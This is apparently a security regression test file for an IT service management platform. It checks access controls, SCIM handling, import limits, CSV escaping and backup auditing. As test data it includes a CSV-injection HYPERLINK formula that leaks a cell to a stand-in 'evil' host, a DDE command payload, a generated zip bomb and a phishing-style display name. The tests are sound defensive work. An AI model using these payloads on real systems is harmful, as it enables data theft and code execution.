// Review fixes of the administration consoles and the integration hub (each case failed before its fix):
//   · a directory source's approval covers what it approved: another member's change of its settings, or the loss of
//     the approver's rights, takes it back; rotating a SCIM token needs the members' administration
//   · nobody borrows an integration user with more access than their own (keys, webhooks)
//   · a directory (SCIM) never renames the global account of someone who works for another organisation
//   · the licence list's people and the studio are for those who administer them
//   · a linked issue shows its record's label only to readers of the record
//   · a create-only key cannot update through an import with a match key
//   · the import-mapping assistant never sends a «هرگز» table's rows to a model
//   · the web version takes only ldaps:// directories (judged when the address is set: an older source stays editable)
//   · spreadsheets are read within bounds (inflated size, rows)
//   · CSV cells that start a formula are written as text
//   · a scheduled URL import starts when saved and goes on after a failed run
//   · every download of a backup is audited
import "./fixtures/rag";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { deflateRawSync } from "node:zlib";
import { engineOrg, type EngineOrg } from "./engine-helpers";
import { Client } from "./helpers";
import { tick } from "@server/jobs";
import { createIn, systemCtx } from "@server/engine";
import { FAKE_INBOX, clearFakeInbox } from "@server/modules/ai/adapters/fake";
import { readSpreadsheet, parseCsv } from "@shared/sheet";
import { csvCell } from "@shared/csv";
import { toCsv } from "@server/modules/admin/exports";

const before = process.env.ITSM_AI_FAKE;
afterAll(() => {
  if (before === undefined) delete process.env.ITSM_AI_FAKE;
  else process.env.ITSM_AI_FAKE = before;
});

let e: EngineOrg;
let P = "";
const drain = async () => {
  for (let i = 0; i < 40; i++) {
    const r = await tick(e.cfg, { budgetMs: 30_000 });
    if (!r.ran && !r.more) break;
  }
};
async function status(c: Client, method: string, path: string, body?: unknown): Promise<number> {
  try {
    await c.req(method, path, body ?? (method === "GET" ? undefined : {}), 200);
    return 200;
  } catch (err) {
    return Number(/→ (\d{3})/.exec(String(err))?.[1] ?? 0);
  }
}
const memberId = async (userId: string) => (await e.db.one<{ id: string }>(`select id from sm_org_members where org_id = $1 and user_id = $2`, [e.org, userId]))!.id;
const scim = (src: string, token: string, method: string, path: string, body?: unknown) =>
  e.app.fetch(new Request(`http://local.test/api/v1/scim/${src}${path}`, { method, headers: { authorization: `Bearer ${token}`, "content-type": "application/scim+json" }, body: body === undefined ? undefined : JSON.stringify(body) }));

beforeAll(async () => {
  process.env.ITSM_AI_FAKE = "1";
  e = await engineOrg();
  P = `/o/${e.org}`;
  // SCIM, issue sync, imports: the enterprise plan (the first account is the platform's owner)
  await e.owner.put(`/admin/orgs/${e.org}/plan`, { plan: "enterprise" });
  await drain();
}, 240_000);

describe("directory sources", () => {
  it("takes the approval back when someone else changes what it approved, and when the approver loses their rights", async () => {
    const hub = await e.member("member", "hub-only@example.com");
    await e.owner.patch(`${P}/members/${await memberId(hub.userId)}`, { overrides: { integrations: "full" } });
    const src = (await e.owner.post(`${P}/r/directory_source`, { name: "Entra آزمون", kind: "scim", mode: "preview", group_map: [] })).row;
    await e.owner.post(`${P}/integration/directory/${src.id}/approve`);
    let cur = (await e.owner.get(`${P}/r/directory_source/${src.id}`)).row;
    await e.owner.patch(`${P}/r/directory_source/${src.id}`, { mode: "apply", version: cur.version });
    cur = (await e.owner.get(`${P}/r/directory_source/${src.id}`)).row;
    expect(cur.approved_by).toBe(e.ownerId);
    // a member with only the hub's rights maps groups to roles: the approval goes, the source back to preview
    await hub.client.patch(`${P}/r/directory_source/${src.id}`, { group_map: [{ source: "Staff", role: "tenant_admin" }], auto_roles: true, version: cur.version });
    const after = (await e.owner.get(`${P}/r/directory_source/${src.id}`)).row;
    expect(after.approved_by ?? null).toBeNull();
    expect(after.mode).toBe("preview");
    // and cannot take a SCIM token of it
    expect(await status(hub.client, "POST", `${P}/integration/secret`, { table: "directory_source", id: src.id })).toBe(403);

    // an administrator approves a source, then is made a plain member: the source stops acting as them
    const admin = await e.member("admin", "dir-admin@example.com");
    const s2 = (await admin.client.post(`${P}/r/directory_source`, { name: "Entra دوم", kind: "scim", mode: "preview" })).row;
    await admin.client.post(`${P}/integration/directory/${s2.id}/approve`);
    const c2 = (await admin.client.get(`${P}/r/directory_source/${s2.id}`)).row;
    await admin.client.patch(`${P}/r/directory_source/${s2.id}`, { mode: "apply", version: c2.version });
    const token = (await admin.client.post(`${P}/integration/secret`, { table: "directory_source", id: s2.id })).secret;
    expect((await scim(s2.id, token, "GET", "/Users")).status).toBe(200);
    await e.owner.patch(`${P}/members/${await memberId(admin.userId)}`, { role: "member" });
    expect((await scim(s2.id, token, "GET", "/Users")).status).toBe(403);
    expect((await e.owner.get(`${P}/r/directory_source/${s2.id}`)).row.approved_by ?? null).toBeNull();
  });

  it("never renames the global account of someone who works for another organisation", async () => {
    const src = (await e.owner.post(`${P}/r/directory_source`, { name: "Entra نام‌ها", kind: "scim", mode: "preview" })).row;
    await e.owner.post(`${P}/integration/directory/${src.id}/approve`);
    const cur = (await e.owner.get(`${P}/r/directory_source/${src.id}`)).row;
    await e.owner.patch(`${P}/r/directory_source/${src.id}`, { mode: "apply", version: cur.version });
    const token = (await e.owner.post(`${P}/integration/secret`, { table: "directory_source", id: src.id })).secret;
    // a person of this organisation who also works for another one
    const other = await e.owner.post("/orgs", { name: "سازمان دیگر آزمون" });
    await e.owner.post(`${P}/members`, { email: "shared.person@example.com", full_name: "نام اصلی", role: "member" });
    await e.owner.post(`/o/${other.id}/members`, { email: "shared.person@example.com", full_name: "نام اصلی", role: "member" });
    const user = (await e.db.one<{ id: string }>(`select id from sm_users where email = 'shared.person@example.com'`))!;
    const r = await scim(src.id, token, "PATCH", `/Users/${user.id}`, { schemas: ["urn:ietf:params:scim:api:messages:2.0:PatchOp"], Operations: [{ op: "replace", value: { displayName: "پشتیبانی سامانه - رمز را بفرستید" } }] });
    expect(r.status).toBe(200);
    const after = (await e.db.one<{ full_name: string }>(`select full_name from sm_users where id = $1`, [user.id]))!;
    expect(after.full_name).toBe("نام اصلی");
  });

  it("takes only ldaps:// directories on the web version", async () => {
    expect(await status(e.owner, "POST", `${P}/r/directory_source`, { name: "AD بی‌رمز", kind: "ldap", ldap_url: "ldap://dc.example.com:389", base_dn: "DC=corp,DC=ir" })).toBe(400);
    const src = (await e.owner.post(`${P}/r/directory_source`, { name: "AD با TLS", kind: "ldap", ldap_url: "ldaps://dc.example.com:636", base_dn: "DC=corp,DC=ir" })).row;
    // a source saved before the rule keeps working for its other settings; a new plain address is refused
    await e.db.query(`update sm_directory_sources set ldap_url = 'ldap://old-dc.example.com:389' where id = $1`, [src.id]);
    let cur = (await e.owner.get(`${P}/r/directory_source/${src.id}`)).row;
    await e.owner.patch(`${P}/r/directory_source/${src.id}`, { name: "AD قدیمی", version: cur.version });
    cur = (await e.owner.get(`${P}/r/directory_source/${src.id}`)).row;
    expect(cur.name).toBe("AD قدیمی");
    expect(await status(e.owner, "PATCH", `${P}/r/directory_source/${src.id}`, { ldap_url: "ldap://new-dc.example.com:389", version: cur.version })).toBe(400);
    await e.owner.patch(`${P}/r/directory_source/${src.id}`, { ldap_url: "ldaps://new-dc.example.com:636", version: cur.version });
  });
});

describe("integration users", () => {
  it("refuses keys and webhooks of an integration user with more access than the caller's", async () => {
    const siem = (await e.owner.post(`${P}/r/integration_user`, { name: "SIEM آزمون" })).row;
    await e.owner.put(`${P}/integration/users/${siem.id}/roles`, { roles: ["tenant_admin", "security_analyst"] });
    const admin = await e.member("admin", "lesser-admin@example.com");
    expect(await status(admin.client, "PUT", `${P}/integration/users/${siem.id}/roles`, { roles: ["agent"] })).toBe(403);
    expect(await status(admin.client, "POST", `${P}/integration/users/${siem.id}/keys`, { name: "کلید", scopes: [{ table: "*", ops: ["read"] }] })).toBe(403);
    expect(await status(admin.client, "POST", `${P}/r/webhook_subscription`, { name: "وب‌هوک", url: "https://hooks.example.com/x", principal_id: siem.id, table_key: "todo", events: ["created"] })).toBe(403);
    // the owner may
    await e.owner.post(`${P}/integration/users/${siem.id}/keys`, { name: "کلید مالک", scopes: [{ table: "todo", ops: ["read"] }] });
  });

  it("does not let a create-only key update rows through an import with a match key", async () => {
    const u = (await e.owner.post(`${P}/r/integration_user`, { name: "ورود آزمون" })).row;
    await e.owner.put(`${P}/integration/users/${u.id}/roles`, { roles: ["agent"] });
    const key = (await e.owner.post(`${P}/integration/users/${u.id}/keys`, { name: "فقط ثبت", scopes: [{ table: "todo", ops: ["read", "create"] }] })).key;
    const api = new Client(e.app);
    api.token = key;
    const mine = (await api.post("/v1/r/todo", { short_description: "کار ورود" })).row;
    expect(await status(api, "POST", "/v1/r/todo/import", { rows: [{ number: mine.number, short_description: "تغییر از ورود" }], key: "number" })).toBe(403);
    expect((await e.owner.get(`${P}/r/todo/${mine.id}`)).row.short_description).toBe("کار ورود");
    await api.post("/v1/r/todo/import", { rows: [{ short_description: "تازه از ورود" }] });
  });
});

describe("consoles", () => {
  it("keeps the licence list's people and the studio to their administrators", async () => {
    const viewer = await e.member("viewer", "console-viewer@example.com");
    const lic = await viewer.client.get(`${P}/admin/licences`);
    expect(lic.people).toEqual([]);
    expect(JSON.stringify(lic)).not.toContain("console-viewer@example.com");
    expect(await status(viewer.client, "GET", `${P}/admin/studio`)).toBe(403);
    expect(await status(viewer.client, "GET", `${P}/admin/studio/export`)).toBe(403);
    expect((await e.owner.get(`${P}/admin/licences`)).people.length).toBeGreaterThan(0);
  });

  it("shows a linked issue's record label only to readers of the record", async () => {
    const sys = await systemCtx(e.cfg, e.org);
    const ws = (await e.owner.post(`${P}/r/workspace`, { key: "secure_refs", name: "فضای امن آزمون", secure: true })).row.id;
    const conn = (await e.owner.post(`${P}/r/issue_connection`, { name: "GitHub آزمون", kind: "github", repo: "acme/app", base_url: "https://api.github.com" })).row.id;
    const { hidden, shown } = await sys.write(async (tx) => {
      const secret = await createIn(tx, sys, "incident", { short_description: "باج‌افزار روی لپ‌تاپ مدیر مالی", workspace_id: ws }, { trusted: true });
      const open = await createIn(tx, sys, "incident", { short_description: "چاپگر طبقهٔ دوم" }, { trusted: true });
      const hidden = await createIn(tx, sys, "external_ref", { remote_key: "acme/app#1", connection_id: conn, table_key: "incident", record_id: secret.id, record_label: "INC SECRET-TITLE" }, { trusted: true });
      const shown = await createIn(tx, sys, "external_ref", { remote_key: "acme/app#2", connection_id: conn, table_key: "incident", record_id: open.id, record_label: "INC چاپگر" }, { trusted: true });
      return { hidden, shown };
    });
    const auditor = await e.member("member", "refs-auditor@example.com");
    await e.owner.put(`${P}/access/members/${auditor.userId}`, { roles: ["auditor"], persona: "agent" });
    const list = (await auditor.client.get(`${P}/r/external_ref?size=50`)).rows;
    expect(JSON.stringify(list)).not.toContain("SECRET-TITLE");
    expect(list.find((r: any) => r.id === hidden.id).record_label ?? null).toBeNull();
    expect(list.find((r: any) => r.id === shown.id).record_label).toBe("INC چاپگر");
  });
});

describe("imports and exports", () => {
  it("keeps the rows of a «هرگز» table from the import-mapping model", async () => {
    await e.owner.post(`${P}/ai/connections`, { preset: "fake" });
    clearFakeInbox();
    const r = await e.owner.post(`${P}/admin/imports/suggest`, { table: "legal_request", headers: ["عنوان", "شرح"], sample: [{ عنوان: "دعوای کارمند", شرح: "PRIVILEGED-SAMPLE-ROW" }] });
    expect(r.ai).toBe(false);
    expect(JSON.stringify(FAKE_INBOX)).not.toContain("PRIVILEGED-SAMPLE-ROW");
  });

  it("reads spreadsheets within bounds: an entry that inflates too far stops, rows stop at the limit", async () => {
    const big = deflateRawSync(Buffer.alloc(70 * 1024 * 1024, 0x61));
    const name = Buffer.from("xl/worksheets/sheet1.xml");
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(8, 8);
    local.writeUInt32LE(big.length, 18);
    local.writeUInt16LE(name.length, 26);
    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(8, 10);
    central.writeUInt32LE(big.length, 20);
    central.writeUInt16LE(name.length, 28);
    central.writeUInt32LE(0, 42);
    const cdOffset = local.length + name.length + big.length;
    const end = Buffer.alloc(22);
    end.writeUInt32LE(0x06054b50, 0);
    end.writeUInt16LE(1, 8);
    end.writeUInt16LE(1, 10);
    end.writeUInt32LE(central.length + name.length, 12);
    end.writeUInt32LE(cdOffset, 16);
    const zip = Buffer.concat([local, name, big, central, name, end]);
    await expect(readSpreadsheet("bomb.xlsx", new Uint8Array(zip))).rejects.toThrow(/بزرگ‌تر/);
    const csv = Array.from({ length: 50 }, (_, i) => `r${i},${i}`).join("\n");
    expect(parseCsv(csv, 10)).toHaveLength(10);
    expect((await readSpreadsheet("rows.csv", new TextEncoder().encode(csv), { maxRows: 5 })).rows).toHaveLength(5);
  });

  it("writes CSV cells that would start a formula as text", () => {
    expect(csvCell('=HYPERLINK("https://evil/?d="&A2,"باز کنید")').startsWith(`"'=`)).toBe(true);
    expect(csvCell("=cmd|' /C calc'!A0")).toBe("'=cmd|' /C calc'!A0");
    expect(csvCell("@SUM(1)")).toBe("'@SUM(1)");
    expect(csvCell("-12.5")).toBe("-12.5");
    const out = toCsv({ columns: [{ name: "short_description", label: "عنوان" }], rows: [["+ffff"], [-3]] } as never);
    expect(out).toContain("'+ffff");
    expect(out).toContain("\r\n-3\r\n");
  });

  it("starts a scheduled URL import when it is saved and keeps the schedule after a failed run", async () => {
    const set = (await e.owner.post(`${P}/r/import_set`, { name: "ورود روزانه", target_table: "todo", source: "url", source_url: "https://127.0.0.1/data.csv", schedule_hours: 24 })).row;
    const queued = async () => (await e.db.query(`select id from sm_jobs where org_id = $1 and kind = 'admin.import.run' and dedupe_key = $2 and status = 'queued'`, [e.org, `import:${set.id}`])).length;
    expect(await queued()).toBe(1);
    // the source is refused (an internal address): the run fails, the next one is queued all the same
    await e.db.query(`update sm_jobs set run_at = now() where org_id = $1 and dedupe_key = $2 and status = 'queued'`, [e.org, `import:${set.id}`]);
    await drain();
    expect((await e.owner.get(`${P}/r/import_set/${set.id}`)).row.status).toBe("failed");
    expect(await queued()).toBe(1);
  });
});

describe("the platform's backups", () => {
  it("audits every download of a backup file", async () => {
    const b = await e.owner.post(`/admin/backups`, { org_id: e.org });
    await drain();
    const res = await e.app.fetch(new Request(`http://local.test/api/admin/backups/${b.backup.id}/download`, { headers: { cookie: e.owner.cookie } }));
    expect(res.status).toBe(200);
    await res.arrayBuffer();
    const audits = await e.db.query(`select id from sm_audit where action = 'backup_download' and entity_id = $1`, [b.backup.id]);
    expect(audits.length).toBe(1);
    const events = await e.db.query(`select id from sm_security_events where kind = 'backup_download' and org_id = $1`, [e.org]);
    expect(events.length).toBe(1);
  });
});
